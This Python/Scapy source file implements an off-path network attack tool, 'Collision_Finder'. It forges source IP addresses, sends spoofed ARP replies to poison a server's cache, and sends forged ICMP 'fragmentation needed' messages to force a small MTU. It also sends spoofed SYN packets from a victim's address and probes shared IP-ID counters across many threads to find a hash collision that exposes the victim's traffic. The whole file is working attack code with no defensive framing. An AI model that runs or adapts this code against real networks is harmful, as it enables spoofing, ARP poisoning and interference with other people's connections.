# coding=utf-8

import struct
import threading
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *


class Collision_Finder:

    def __init__(self, server_mac_addr, owned_prefix,
                 client_ip='10.10.100.1', server_ip='10.10.100.2',
                 bind_iface='ens33', num_thread=20, verbose=False):
        prefix = owned_prefix[:owned_prefix.find('.', owned_prefix.find('.') + 1) + 1]
        self.forge_ip_prefix = prefix
        self.victim_ip = client_ip
        self.server_ip = server_ip

        self.my_iface_name = bind_iface
        self.server_mac_addr = server_mac_addr
        self.my_mac_addr = get_if_hwaddr(bind_iface)

        self.__z_payload = b''
        for i in range(0, 520):
            self.__z_payload += struct.pack('B', 0)

        self.NUM_T = num_thread

        self.__semaphore = threading.Semaphore(1)
        self.__semaphore_ipid = threading.Semaphore(1)

        self.__num1 = 2
        self.__num2 = 2

        self.verbose = verbose
        self.found = False
        self.result = 'no result'

    def arp_inject(self, forged_ip):
        pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + self.server_mac_addr,
                    iface=self.my_iface_name, count=1, timeout=0.3, started_callback=
                    lambda: send(IP(src=forged_ip, dst=self.server_ip) / UDP(dport=80),
                                 iface=self.my_iface_name, verbose=False))
        if len(pkt) == 1 and pkt[0][1].fields['psrc'] == self.server_ip and pkt[0][1].fields['pdst'] == forged_ip:
            send(ARP(pdst=self.server_ip, hwdst=self.server_mac_addr, psrc=forged_ip, hwsrc=self.my_mac_addr, op=2),
                 iface=self.my_iface_name, verbose=False)

    def check_collision(self, forged_ip, D):
        negative = 0
        for i in range(0, D):
            self.__semaphore_ipid.acquire()
            pkts = sniff(filter="icmp and dst " + forged_ip,
                         iface=self.my_iface_name, count=2, timeout=0.2, started_callback=
                         lambda: send([
                             IP(src=forged_ip, dst=self.server_ip) / ICMP(),
                             IP(src=self.victim_ip, dst=self.server_ip) / TCP(sport=RandShort(), dport=22, flags='S'),
                             IP(src=forged_ip, dst=self.server_ip) / ICMP()
                         ], iface=self.my_iface_name, verbose=False))
            self.__semaphore_ipid.release()

            if len(pkts) == 2:
                ipid1 = pkts[0][1].fields['id']
                ipid2 = pkts[1][1].fields['id']

                if abs(ipid2 - ipid1) >= 2:
                    negative += 1
                else:
                    break

            else:
                i -= 1

        if negative == D:
            return True
        else:
            return False

    def check_new(self):

        if self.found == True or self.__num1 == 128:
            if self.verbose:
                print(self.result)
            return

        self.__semaphore.acquire()
        forge_ip = self.forge_ip_prefix + str(self.__num1) + '.' + str(self.__num2)
        self.__num2 += 1
        if self.__num2 == 254:
            self.__num2 = 2
            self.__num1 += 1
            if self.verbose:
                print('Now we are checking: ' + self.forge_ip_prefix + str(self.__num1) + '.0')
        self.__semaphore.release()

        if self.verbose:
            print('Now we are checking: ' + forge_ip)

        self.arp_inject(forge_ip)

        send(IP(src=forge_ip, dst=self.server_ip) /
             ICMP(type=3, code=4, nexthopmtu=68) /
             IP(flags=2, src=self.server_ip, dst=self.victim_ip) /
             ICMP(type=0, code=0) /
             self.__z_payload,
             iface=self.my_iface_name, verbose=False)

        if self.check_collision(forge_ip, 1):
            if self.check_collision(forge_ip, 1) and self.check_collision(forge_ip, 2) and self.check_collision(forge_ip, 8):
                self.__semaphore.acquire()
                self.result = forge_ip
                self.found = True
                self.__semaphore.release()
                if self.verbose:
                    print('--Collision Found! ' + self.result)
        else:
            pass

        t = threading.Thread(target=self.check_new)
        t.start()

    def run(self):
        s_t = time.time()
        for i in range(0, self.NUM_T):
            t = threading.Thread(target=self.check_new)
            t.start()
            time.sleep(0.1)
            if self.verbose:
                print('Num_' + str(i) + ' thread started.')

        while not self.found:
            time.sleep(1)

        e_t = time.time()
        print('------ Collision Find ------')
        print('Target Server: ' + self.server_ip)
        print('Target Victim: ' + self.victim_ip)
        print('Collision IP : ' + self.result)
        print('Cost Time: ' + str(e_t - s_t) + ' (s)')

        return e_t - s_t
